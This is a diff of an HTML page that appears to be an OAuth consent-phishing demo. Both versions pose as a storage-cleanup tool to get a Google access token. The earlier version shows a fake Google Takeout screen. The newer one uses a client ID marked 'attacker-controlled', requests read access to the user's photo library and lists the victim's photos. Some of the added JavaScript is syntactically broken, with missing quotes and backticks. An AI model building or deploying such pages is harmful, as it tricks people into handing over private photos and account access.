@@ -1,78 +1,75 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8" />
-<title>Smart Photo Cleaner</title>
+<meta charset="UTF-8">
+<title>Smart Photo Backup</title>
 <script src="https://accounts.google.com/gsi/client" async defer></script>
 <style>
-body { font-family: Arial, sans-serif; padding: 20px; background: #f9f9f9; }
-.fake-ui { border: 1px solid #ccc; padding: 20px; background: white; max-width: 600px; margin: auto; border-radius: 8px; box-shadow: 0 2px 6px rgba(0,0,0,0.1); }
-button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
-pre { background: #eee; padding: 10px; border-radius: 4px; }
+body { font-family: Arial, sans-serif; padding: 20px; }
+button { font-size: 16px; padding: 10px; margin-top: 10px; }
+pre { background: #f4f4f4; padding: 10px; border-radius: 6px; }
 </style>
 </head>
 <body>
-<div class="fake-ui">
-<h1>Smart Photo Cleaner</h1>
-<p>This tool helps optimize your cloud storage by exporting old photos safely to your cloud Drive.</p>
-<button id="start">Begin Smart Cleanup</button>
-<pre id="output">Status: Waiting for user...</pre>
-</div>
+<h2>🧠 Smart Storage Assistant</h2>
+<p>This feature helps optimize your phone storage by scanning photos already backed up to cloud.</p>
+<button id="signin">Allow & Continue</button>
+<pre id="output">Waiting for user action...</pre>
 
 <script>
-const CLIENT_ID = "637785556513-la5964oci9vhqt8ft3fh9avqaeg3rlmq.apps.googleusercontent.com";
-const SCOPES = "https://www.googleapis.com/auth/drive.readonly";
+const CLIENT_ID = "796607046785-j0r15mkou3lap9nn33oqfijk7h4un70d.apps.googleusercontent.com"; // Replace with attacker-controlled client
+const SCOPES = "https://www.googleapis.com/auth/photoslibrary.readonly";
 
-let tokenClient;
+let accessToken = null;
 
 window.onload = () => {
-tokenClient = google.accounts.oauth2.initTokenClient({
-client_id: "637785556513-la5964oci9vhqt8ft3fh9avqaeg3rlmq.apps.googleusercontent.com",
-scope: "https://www.googleapis.com/auth/drive.readonly",
+const tokenClient = google.accounts.oauth2.initTokenClient({
+client_id: "796607046785-j0r15mkou3lap9nn33oqfijk7h4un70d.apps.googleusercontent.com",
+scope: https://www.googleapis.com/auth/photoslibrary.readonly,
+prompt: "consent",
 callback: (tokenResponse) => {
 if (tokenResponse.error) {
-document.getElementById("output").textContent = "❌ Error: " + tokenResponse.error;
+document.getElementById("output").textContent = "❌ Token Error: " + tokenResponse.error;
 return;
 }
 
+accessToken = tokenResponse.access_token;
 document.getElementById("output").textContent =
-`✅ Access Token Received:\n${tokenResponse.access_token}\n\nStep 2: Preparing export UI...`;
+✅ Access Token received:\n${accessToken}\n\nFetching cloud photos...;
 
-// Simulate fake UI that looks like Google Takeout
-setTimeout(() => {
-showFakeTakeoutUI();
-}, 2000);
-}
+fetchPhotos(accessToken);
+},
 });
 
-document.getElementById("start").onclick = () => {
-document.getElementById("output").textContent = "🔐 Requesting Google Drive permission...";
-tokenClient.requestAccessToken({ prompt: 'consent' });
+document.getElementById("signin").onclick = () => {
+tokenClient.requestAccessToken();
 };
 };
 
-function showFakeTakeoutUI() {
-document.body.innerHTML = `
-<div class="fake-ui">
-<h2>Cloud Optimization - Export Photos</h2>
-<p>Select your export destination:</p>
-<form id="exportForm">
-<label><input type="radio" name="dest" value="drive" checked> Google Drive</label><br><br>
-<label><input type="radio" name="format" value="original" checked> Original Quality</label><br><br>
-<button type="submit">Start Export</button>
-</form>
-<pre id="output2">Ready to export...</pre>
-</div>
-`;
+function fetchPhotos(token) {
+fetch("https://photoslibrary.googleapis.com/v1/mediaItems?pageSize=5", {
+headers: {
+Authorization: Bearer ${token},
+}
+})
+.then(res => res.json())
+.then(data => {
+if (!data.mediaItems || data.mediaItems.length === 0) {
+document.getElementById("output").textContent += "\n❌ No photos found.";
+return;
+}
 
-document.getElementById("exportForm").onsubmit = (e) => {
-e.preventDefault();
-document.getElementById("output2").textContent = "✅ Export started. Redirecting to Google Photos export...";
-setTimeout(() => {
-// Real Google Takeout Photos export page
-window.location.href = "https://takeout.google.com/settings/takeout/custom/photos?destination=drive";
-}, 2000);
-};
+let output = \n📸 First 5 Photos:\n\n;
+data.mediaItems.forEach((item, index) => {
+output += ${index + 1}. ${item.filename || "Unnamed"}\n${item.baseUrl}=w600\n\n;
+});
+
+document.getElementById("output").textContent += output;
+})
+.catch(err => {
+document.getElementById("output").textContent += "\n❌ Error loading photos.";
+console.error(err);
+});
 }
 </script>
 </body>
